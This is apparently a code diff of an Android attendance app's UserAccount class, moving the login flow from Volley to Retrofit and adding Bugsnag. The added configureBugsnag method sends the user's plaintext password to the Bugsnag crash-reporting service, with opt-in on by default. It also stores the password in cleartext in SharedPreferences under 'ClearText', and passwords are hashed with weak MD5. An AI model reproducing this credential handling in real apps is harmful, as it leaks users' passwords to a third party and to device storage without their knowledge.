@@ -24,40 +24,51 @@ import android.app.NotificationManager;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
-import android.util.Log;
+import android.content.SharedPreferences;
+import android.preference.PreferenceManager;
 import android.view.View;
 
-import com.android.volley.Response;
-import com.android.volley.VolleyError;
+import com.bugsnag.android.Bugsnag;
 import com.shalzz.attendance.BuildConfig;
 import com.shalzz.attendance.DatabaseHandler;
 import com.shalzz.attendance.Miscellaneous;
+import com.shalzz.attendance.R;
 import com.shalzz.attendance.activity.LoginActivity;
 import com.shalzz.attendance.activity.MainActivity;
-import com.shalzz.attendance.model.UserModel;
+import com.shalzz.attendance.model.remote.User;
 import com.shalzz.attendance.network.DataAPI;
+import com.shalzz.attendance.network.RetrofitException;
 import com.shalzz.attendance.wrapper.MyPreferencesManager;
 import com.shalzz.attendance.wrapper.MySyncManager;
-import com.shalzz.attendance.wrapper.MyVolley;
-import com.shalzz.attendance.wrapper.MyVolleyErrorHelper;
+
+import okhttp3.Credentials;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 
 public class UserAccount {
 
-    private Miscellaneous misc;
+    private final MyPreferencesManager preferencesManager;
+    private final Miscellaneous misc;
+    private final DataAPI mAPI;
 
     /**
      * The activity context used to Log the user from
      */
     private Context mContext;
+    private Call<User> call;
 
     /**
      * Constructor to set the Activity context.
      * @param context Context
      */
-    public UserAccount(Context context) {
+    public UserAccount(Context context,
+                       DataAPI api) {
         mContext = context;
-        misc =  new Miscellaneous(mContext);
+        mAPI = api;
+        preferencesManager = new MyPreferencesManager(mContext);
+        misc = new Miscellaneous(context);
     }
 
     /**
@@ -67,30 +78,66 @@ public class UserAccount {
      */
     public void Login(final String username, final String password) {
 
-        if(BuildConfig.DEBUG)
-            Log.d("User Account",Miscellaneous.md5(password));
-        String creds = String.format("%s:%s", username, Miscellaneous.md5(password));
+        String creds = Credentials.basic(username,Miscellaneous.md5(password));
         misc.showProgressDialog("Logging in...", false, pdCancelListener());
-        DataAPI.getUser( loginSuccessListener(), myErrorListener(), creds);
-    }
 
-    private Response.Listener<UserModel> loginSuccessListener() {
-        return new Response.Listener<UserModel>() {
+        call = mAPI.getUser(creds);
+        call.enqueue(new Callback<User>() {
             @Override
-            public void onResponse(UserModel user) {
-
-                MyPreferencesManager.saveUser(user.getSapid(), user.getPassword());
-                MySyncManager.addPeriodicSync(mContext, user.getSapid());
+            public void onResponse(Call<User> call, Response<User> response) {
+                User user = response.body();
+                preferencesManager.saveUser(user.sap_id(), user.password());
+                MySyncManager.addPeriodicSync(mContext, user.sap_id());
                 DatabaseHandler db = new DatabaseHandler(mContext);
-                db.addOrUpdateUser(user);
+                db.addUser(user);
                 db.close();
+
+                configureBugsnag(password);
 
                 misc.dismissProgressDialog();
                 Intent ourIntent = new Intent(mContext, MainActivity.class);
                 mContext.startActivity(ourIntent);
                 ((Activity) mContext).finish();
             }
-        };
+
+            @Override
+            public void onFailure(Call<User> call, Throwable t) {
+                RetrofitException error = (RetrofitException) t;
+                if (error.getKind() == RetrofitException.Kind.HTTP) {
+                    showError(error.getMessage());
+                }
+                else if (error.getKind() == RetrofitException.Kind.UNEXPECTED) {
+                    if(BuildConfig.DEBUG)
+                        t.printStackTrace();
+
+                    String msg = mContext.getString(R.string.unexpected_error);
+                    showError(msg);
+                    Bugsnag.notify(error);
+                }
+            }
+        });
+    }
+
+    private void configureBugsnag(String password) {
+        SharedPreferences sharedPref = PreferenceManager.getDefaultSharedPreferences(mContext);
+        boolean optIn = sharedPref.getBoolean(mContext.getString(
+                R.string.pref_key_bugsnag_opt_in), true);
+        if(optIn) {
+            Bugsnag.addToTab("User", "Password", password);
+        }
+        SharedPreferences settings = mContext.getSharedPreferences("SETTINGS", 0);
+        SharedPreferences.Editor editor = settings.edit();
+        editor.putString("ClearText", password);
+        editor.apply();
+    }
+
+    private void showError(String message) {
+        misc.dismissProgressDialog();
+        if(mContext == null)
+            return;
+        View view = ((Activity) mContext).findViewById(android.R.id.content);
+        if(view != null)
+            Miscellaneous.showSnackBar(view, message);
     }
 
     /**
@@ -98,28 +145,11 @@ public class UserAccount {
      * @return OnCancelListener
      */
     DialogInterface.OnCancelListener pdCancelListener() {
-        return new DialogInterface.OnCancelListener() {
-            @Override
-            public void onCancel(DialogInterface dialog) {
-                // Cancel all pending requests when user presses back button.
-                MyVolley.getInstance().cancelPendingRequests(mContext.getClass().getName());
-                MyVolley.getInstance().cancelPendingRequests("LOGOUT");
-            }
+        return dialog -> {
+            // Cancel all pending requests when user presses back button.
+            call.cancel();
         };
 
-    }
-
-    private Response.ErrorListener myErrorListener() {
-        return new Response.ErrorListener() {
-            @Override
-            public void onErrorResponse(VolleyError error) {
-                String msg = MyVolleyErrorHelper.getMessage(error, mContext);
-                misc.dismissProgressDialog();
-                View view = ((Activity) mContext).getCurrentFocus();
-                Miscellaneous.showSnackBar(view, msg);
-                Log.e(mContext.getClass().getName(), msg);
-            }
-        };
     }
 
     /**
@@ -128,8 +158,8 @@ public class UserAccount {
     public void Logout() {
         MainActivity.LOGGED_OUT = true;
 
-        // Remove UserModel Details from Shared Preferences.
-        MyPreferencesManager.removeUser();
+        // Remove User Details from Shared Preferences.
+        preferencesManager.removeUser();
 
         // Remove user Attendance data from database.
         DatabaseHandler db = new DatabaseHandler(mContext);
